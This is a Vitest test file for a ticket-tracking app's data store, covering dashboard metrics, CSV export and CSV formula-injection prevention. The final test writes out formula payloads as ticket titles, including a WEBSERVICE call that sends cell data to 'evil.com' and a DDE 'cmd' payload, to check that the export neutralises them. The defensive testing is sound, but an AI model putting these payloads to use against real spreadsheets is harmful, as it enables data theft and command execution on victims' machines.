import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";
import { unlink } from "node:fs/promises";
import path from "node:path";

// Mock server-only and next/cache for vitest environment
vi.mock("server-only", () => ({}));
vi.mock("next/cache", () => ({
  unstable_noStore: () => {}
}));

const dataFile = path.join(process.cwd(), ".data", "fixit-db.json");

async function resetDatabase() {
  try {
    await unlink(dataFile);
  } catch {
    // File doesn't exist yet - that's fine
  }
}

describe("getStoreDashboard", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns zero metrics for store with no tickets", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_waw01");

    expect(dashboard.openTickets).toBe(0);
    expect(dashboard.criticalTickets).toBe(0);
    expect(dashboard.blockingTickets).toBe(0);
    expect(dashboard.resolvedToday).toBe(0);
    expect(dashboard.recentEvents).toHaveLength(0);
  });

  it("returns zero metrics for store_krk02 (no tickets)", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_krk02");

    expect(dashboard.openTickets).toBe(0);
    expect(dashboard.criticalTickets).toBe(0);
    expect(dashboard.blockingTickets).toBe(0);
    expect(dashboard.resolvedToday).toBe(0);
    expect(dashboard.recentEvents).toHaveLength(0);
  });

  it("returns empty events list when no tickets exist", async () => {
    const { getStoreDashboard } = await import("@/lib/data-store");

    const dashboard = await getStoreDashboard("store_waw01");

    expect(dashboard.recentEvents).toHaveLength(0);
  });
});

describe("getDashboardMetrics", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns zero metrics from seed data (no tickets yet)", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.totalTickets).toBe(0);
    expect(metrics.openTickets).toBe(0);
    expect(metrics.criticalTickets).toBe(0);
    expect(metrics.avgResolutionHours).toBeNull();
  });

  it("returns empty top categories when no tickets exist", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.topCategories).toHaveLength(0);
  });

  it("returns empty SLA breaches when no tickets exist", async () => {
    const { getDashboardMetrics } = await import("@/lib/data-store");

    const metrics = await getDashboardMetrics();

    expect(metrics.slaBreached).toHaveLength(0);
  });
});

describe("exportTicketsCSV", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("returns CSV with header row only when no tickets exist", async () => {
    const { exportTicketsCSV } = await import("@/lib/data-store");

    const csv = await exportTicketsCSV();

    const lines = csv.trim().split("\n");
    expect(lines.length).toBe(1); // header only

    // Header should contain expected columns
    expect(lines[0]).toContain("Numer");
    expect(lines[0]).toContain("Tytul");
    expect(lines[0]).toContain("Status");
    expect(lines[0]).toContain("Priorytet");
  });
});

describe("CSV injection prevention", () => {
  beforeEach(resetDatabase);
  afterEach(resetDatabase);

  it("neutralizes formula injection in ticket titles via export", async () => {
    const { createTicket, exportTicketsCSV, readDatabase } = await import("@/lib/data-store");

    // Create tickets with formula-like titles
    await createTicket({
      title: "=WEBSERVICE(\"https://evil.com/\"&A1)",
      description: "Test formula injection",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "+SUM(1,1)",
      description: "Plus formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "-DDE(\"cmd\")",
      description: "Minus formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    await createTicket({
      title: "@SUM(1,1)",
      description: "At formula",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    // Safe title should not be affected
    await createTicket({
      title: "Normal title with no injection",
      description: "Safe",
      blocksWork: false,
      contact: "test@bagietka.pl",
      categoryId: "cat_other",
      reporterId: "usr_admin",
      priority: "NORMAL"
    });

    const csv = await exportTicketsCSV();

    // Formula values should be neutralized (prepended with tab prefix)
    // The tab prevents spreadsheet software from executing formulas
    expect(csv).toContain("\t=WEBSERVICE");
    expect(csv).toContain("\t+SUM");
    expect(csv).toContain("\t-DDE");
    expect(csv).toContain("\t@SUM");

    // Safe values should remain unchanged
    expect(csv).toContain("Normal title with no injection");
  });
});
